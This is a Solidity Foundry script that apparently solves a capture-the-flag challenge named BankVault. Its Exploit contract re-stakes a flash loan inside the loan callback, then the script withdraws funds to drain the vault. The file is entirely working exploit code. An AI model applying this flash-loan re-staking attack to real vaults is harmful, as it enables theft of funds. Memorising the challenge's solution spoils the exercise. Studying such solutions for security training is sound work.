// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Setup,MockERC20,BankVaults} from "../../../src/WarGames_CTF/BankVault/Setup.sol";
import {Script,console} from "forge-std/Script.sol";


contract Solve is Script{
    function run()public{
        
        vm.startBroadcast();
        address _setup=address(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        Setup setup=Setup(_setup);
        BankVaults bank=setup.challengeInstance();
        Exploit exploit=new Exploit(bank);
        bank.stake{value:1}(msg.sender);
        bank.flashLoan(50 ether,address(exploit),block.timestamp+ 3* 365 days);
        bank.withdraw(50 ether,msg.sender,address(exploit));
        bank.stake{value:1}(msg.sender);
        bank.withdraw(2,msg.sender,msg.sender);
        vm.stopBroadcast();
    }
}

contract Exploit{
    BankVaults bank;

    constructor(BankVaults _bank){
        bank=_bank;
    }


    function executeFlashLoan(uint256 amount) external{
        bank.stake{value:50 ether}(address(this));
    }

    receive() external payable{}
}